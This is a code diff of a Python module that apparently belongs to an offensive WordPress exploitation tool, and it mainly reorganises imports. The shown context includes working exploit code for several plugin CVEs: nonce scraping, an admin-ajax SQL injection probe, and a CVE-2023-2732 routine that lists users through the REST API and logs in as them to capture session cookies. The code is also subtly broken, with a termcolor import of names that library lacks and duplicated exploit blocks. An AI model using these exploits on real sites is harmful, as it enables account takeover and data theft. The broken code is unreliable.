@@ -2,18 +2,17 @@
 # See the file 'LICENSE' for copying permission.
 # wordpress.py profile critical
 from __future__ import unicode_literals
-from colorama import Fore, Style
+from colorama import Fore, Style, init
 
 # CVE-2022-0441 EXPLOIT STARTS
 
-import requests
 import re
-from urllib3.exceptions import InsecureRequestWarning
-from colorama import init, Fore, Style
-
+import requests
 init(autoreset=True)
+import urllib3
+from termcolor import Fore, Style, init
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 def masterstudy_0441(profile_url, timeout=5):
     session = requests.Session()
@@ -72,13 +71,7 @@ def scan_cve_2022_0441(profile_url):
 
 # CVE-2022-0316 EXPLOIT STARTS
 
-import requests
-from colorama import init, Fore, Style
 from random import getrandbits
-
-init(autoreset=True)
-
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 vulnerable_paths = [
     "westand", "footysquare", "aidreform", "statfort", "club-theme",
@@ -158,11 +151,7 @@ def scan_cve_2022_0316(profile_url):
 import binascii
 import json
 import os
-import requests
-import urllib3
 from bs4 import BeautifulSoup
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def encode_multipart_form_data_1386(fields):
@@ -324,14 +313,7 @@ def run_exploit_1386(profile_url):
 
 # CVE-2022-0739 EXPLOIT STARTS
 
-import requests
-import re
-import json
-from colorama import init, Fore, Style
 
-init(autoreset=True)
-
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 def extract_data_0739(response_body):
 
@@ -409,14 +391,6 @@ def scan_cve_2022_0739(profile_url):
 
 # CVE-2022-0441 EXPLOIT STARTS
 
-import requests
-import re
-from urllib3.exceptions import InsecureRequestWarning
-from colorama import init, Fore, Style
-
-init(autoreset=True)
-
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 def masterstudy_0441(profile_url, timeout=5):
     session = requests.Session()
@@ -472,12 +446,7 @@ def scan_cve_2022_0441(profile_url):
 
 # CVE-2023-28121 EXPLOIT STARTS
 
-import re
-import urllib3
-import requests
-from colorama import Fore, Style
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def verify_woocommerce_version_28121(profile_url):
     print(Style.RESET_ALL + "Checking WooCommerce Payments version:", end=' ')
@@ -543,11 +512,6 @@ def main_28121(profile_url):
 
 # CVE-2021-24499 EXPLOIT STARTS
 
-import requests
-import urllib3
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 class Colors:
     BOLD = '\033[1m'
     GREEN = '\033[92m'
@@ -593,12 +557,6 @@ def scan_cve_2021_24499(profile_url):
 
 # CVE-2021-24507 EXPLOIT Starts
 
-import requests
-import re
-import json
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 session = requests.Session()
 
 def retrieve_nonce_24507(profile_url):
@@ -674,9 +632,6 @@ def scan_cve_2021_24507(target):
 
 # CVE-2021-25003 EXPLOIT Starts
 
-import requests
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def wpcargo_exploit_25003(profile_url, timeout=5):
     payload = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx'
@@ -707,13 +662,6 @@ def scan_cve_2021_25003(profile_url):
 # CVE-2021-25003 EXPLOIT ENDS
 
 # CVE-2021-24884 EXPLOIT STARTS
-
-import requests
-import re
-from colorama import init, Fore, Style
-
-init(autoreset=True)
-requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 def extract_wp_nonce_24884(profile_url):
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Extracting wp_nonce from the theme editor page...")
@@ -802,15 +750,9 @@ def scan_cve_2021_24884(profile_url):
 
 import base64
 import hashlib
-import requests
 import time
 import urllib.parse
-from colorama import init, Fore, Style
-import urllib3
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-init(autoreset=True)
 
 DEFAULT_USER_ID = 1  
 COUNT = 5
@@ -858,13 +800,8 @@ def scan_cve_2021_34656(profile_url):
 
 # CVE-2021-24507 EXPLOIT STARTS
 
-import requests
-import re
-import json
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-session = requests.Session()
+sessionn = requests.Session()
 
 def retrieve_nonce_24507(profile_url):
     headers = {
@@ -881,7 +818,7 @@ def retrieve_nonce_24507(profile_url):
         "Accept-Language": "en-US,en;q=0.9",
         "Connection": "close"
     }
-    response = session.get(profile_url, headers=headers, allow_redirects=True, verify=False)
+    response = sessionn.get(profile_url, headers=headers, allow_redirects=True, verify=False)
     if 'infinite_nonce' in response.text:
         nonce = re.compile('infinite_nonce":"(.+?)",').findall(str(response.text))[0]
         return nonce, response.url
@@ -914,7 +851,7 @@ def submit_request_24507(profile_url, nonce, payload):
         "Content-Type": "application/x-www-form-urlencoded"
     }
     profile_url += '/wp-admin/admin-ajax.php'
-    response = session.post(profile_url, headers=headers, data=data, verify=False)
+    response = sessionn.post(profile_url, headers=headers, data=data, verify=False)
     return response.text
 
 def assess_sqli_vulnerability_24507(profile_url, nonce):
@@ -941,10 +878,8 @@ def scan_cve_2021_24507(target):
 # CVE-2023-2732 EXPLOIT STARTS
 
 import click
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-session = requests.Session()
+
+sessionnn = requests.Session()
 
 def version_check_2732(profile_url):
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
@@ -974,7 +909,7 @@ def version_check_2732(profile_url):
                 return False
         else:
             print("[•] Failed to fetch readme.txt file, checking via wp-json API...")
-            response = session.get(f"{profile_url}/wp-json/", headers=headers, verify=False, timeout=30)
+            response = sessionnn.get(f"{profile_url}/wp-json/", headers=headers, verify=False, timeout=30)
             if "add-listing" in response.text and "get-nearby-listings" in response.text:
                 print("[•] The plugin might be installed, but we couldn't verify the version. Proceeding with exploit...")
                 return True
@@ -990,7 +925,7 @@ def fetch_users_from_rest_api_2732(profile_url):
     print("[•] Fetching usernames via the REST API...")
     
     try:
-        response = session.get(f"{profile_url}/wp-json/wp/v2/users", headers=headers, verify=False, timeout=30)
+        response = sessionnn.get(f"{profile_url}/wp-json/wp/v2/users", headers=headers, verify=False, timeout=30)
         
         if response.status_code == 200:
             users = response.json()
@@ -1026,7 +961,7 @@ def attempt_login_as_user_2732(profile_url, user_id, username):
     print(f"[•] Attempting to authenticate as user '{username}' using the exploit...")
     
     try:
-        response = session.get(exploit_url, headers=headers, verify=False, timeout=30)
+        response = sessionnn.get(exploit_url, headers=headers, verify=False, timeout=30)
         cookies = requests.utils.dict_from_cookiejar(response.cookies)
         
         if any(cookie.startswith('wordpress_logged_in_') for cookie in cookies):
@@ -1062,12 +997,6 @@ def scan_cve_2023_2732(profile_url):
 
 
 # CVE-2023-2732 EXPLOIT ENDS
-
-
-
-
-
-
 
 def handle_wordpress_exploit(profile_url):
     try:
